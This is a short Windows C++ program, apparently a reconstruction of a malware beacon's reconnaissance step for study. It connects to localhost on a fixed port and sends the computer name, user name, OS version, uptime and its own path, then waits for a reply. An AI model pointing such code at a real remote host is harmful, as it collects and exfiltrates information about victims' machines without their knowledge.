#include "stdafx.h"
#include <WinSock2.h>
#include <Ws2tcpip.h>
#pragma   warning(disable: 4996)
#pragma comment (lib,"ws2_32.lib")
int main()
{
	LPCSTR IPAddr = "127.0.0.1";
	CHAR Optval[8] = { 0 };
	CHAR ComputerName[0x104] = { 0 };
	DWORD BufferSize = 0x104;
	sockaddr SockAddr = { 0 };
	WSADATA WSAData = { 0 };

	WSAStartup(0x202, &WSAData);
	SOCKET Socket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	DWORD IP;
	inet_pton(AF_INET, IPAddr, &IP);

	SockAddr.sa_family = AF_INET;
	SockAddr.sa_data[0] = 0xDF;
	SockAddr.sa_data[1] = 0x76;
	memcpy_s(&SockAddr.sa_data[2], 4, &IP, 4);
	connect(Socket, &SockAddr, 0x10);

	Optval[0] = 1;
	setsockopt(Socket, SOL_SOCKET, SO_RCVTIMEO,Optval,8);

	GetComputerNameA(ComputerName, &BufferSize);
	send(Socket, ComputerName, BufferSize, 0);
	Sleep(150);

	BufferSize = 0x104;
	GetUserNameA(ComputerName, &BufferSize);
	send(Socket, ComputerName, BufferSize, 0);
	Sleep(150);

	DWORD Version = GetVersion();
	CHAR VersionInfo[12] = { 0 };
	wsprintfA(VersionInfo, "%#x", Version);

	send(Socket, VersionInfo, strlen(VersionInfo), 0);
	Sleep(150);

	CHAR BootTime[400] = { 0 };
	DWORD SystemStart = 0;
	GetTickCount();
	__asm
	{
		MOV ECX,EAX
		MOV EAX,0x45E7B273
		MUL ECX
		SHR EDX,0xE
		MOV SystemStart,EDX
	}
	wsprintfA(BootTime,"The System Had Start For %d Mins,",SystemStart);
	printf("The System Had Start For %d Mins\n", SystemStart);


	CHAR FileName[0x104] = { 0 };
	CHAR Info[270] = { 0 };
	GetModuleFileNameA(0, FileName, 0x104);

	printf("Current Program Path: %s", FileName);
	wsprintfA(Info,"Current Program Path: %s", FileName);
	strcat_s(BootTime, 400, Info);

	send(Socket, BootTime, 400, 0);

	CHAR Recv[1024] = { 0 };

	recv(Socket, Recv, 0x400, 0);
    

	WSACleanup();
	printf("\n");
	system("pause");
    return 0;
}

